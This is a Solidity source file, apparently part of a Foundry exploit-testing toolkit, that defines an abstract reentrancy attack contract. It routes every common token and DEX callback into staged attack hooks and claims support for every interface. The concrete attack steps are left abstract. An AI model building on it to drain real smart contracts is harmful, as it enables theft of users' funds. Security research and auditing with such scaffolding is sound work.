// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";

abstract contract Reentrancy {
    enum State {
        PRE_ATTACK,
        ATTACK,
        POST_ATTACK
    }

    State reentrancyStage;

    /**
     * @dev Initiates the reentrancy attack. Make any calls to the target contract, and continue reentrancy attack in the below callback function
     */
    function initiateAttack() external virtual;

    /**
     * @dev Function run the first time the callback is entered
     */
    function _executeAttack() internal virtual;

    /**
     * @dev Function run after the attack is executed
     */
    function _completeAttack() internal virtual;

    /**
     * @dev Function run when target contract makes external call back to attack contract
     */
    function _reentrancyCallback() internal virtual incrementState {
        console.log("Begin reentrancy stage %s", uint256(reentrancyStage));
        if (reentrancyStage == State.ATTACK) {
            // Execute attack
            console.log("Execute attack");
            _executeAttack();
        } else if (reentrancyStage == State.POST_ATTACK) {
            // Already ran the attack once
            console.log("Attack completed successfully");
            _completeAttack();
        } else {
            // No state defined
        }
    }

    modifier incrementState() virtual {
        reentrancyStage = State(uint256(reentrancyStage) + 1);
        _;
    }

    /**
     * @dev The callback function for uniswap exchange
     */
    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        _reentrancyCallback();
    }

    /**
     * @dev Handles the receipt of ERC677 token type.
     */
    function onTokenTransfer(address, uint256, bytes memory) external returns (bool) {
        _reentrancyCallback();
        return true;
    }

    /**
     * @dev Handles the receipt of ERC1363 token type.
     */
    function onTransferReceived(address, address, uint256, bytes memory) external returns (bytes4) {
        _reentrancyCallback();
        return this.onTransferReceived.selector;
    }

    /**
     * @dev Handles the receipt of ERC777 token type.
     */
    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external {
        _reentrancyCallback();
    }

    /**
     * @dev Handles the receipt of a single ERC1155 token type. This function is
     * called at the end of a `safeTransferFrom` after the balance has been updated.
     */
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {
        _reentrancyCallback();
        return this.onERC1155Received.selector;
    }

    /**
     * @dev Handles the receipt of a multiple ERC1155 token types. This function
     * is called at the end of a `safeBatchTransferFrom` after the balances have
     * been updated.
     */
    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        returns (bytes4)
    {
        _reentrancyCallback();
        return this.onERC1155BatchReceived.selector;
    }

    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     */
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        _reentrancyCallback();
        return this.onERC721Received.selector;
    }

    /**
     * @dev Fallback function called when no other functions match the function signature
     */
    fallback() external payable {
        _reentrancyCallback();
    }

    /**
     * @dev Function called when native asset is sent with no calldata
     */
    receive() external payable {
        _reentrancyCallback();
    }

    /**
     * @dev We need to implement this function to tell contracts we support their callback interface
     * @return true Always returns true
     */
    function supportsInterface(bytes4) public pure returns (bool) {
        return true;
    }
}
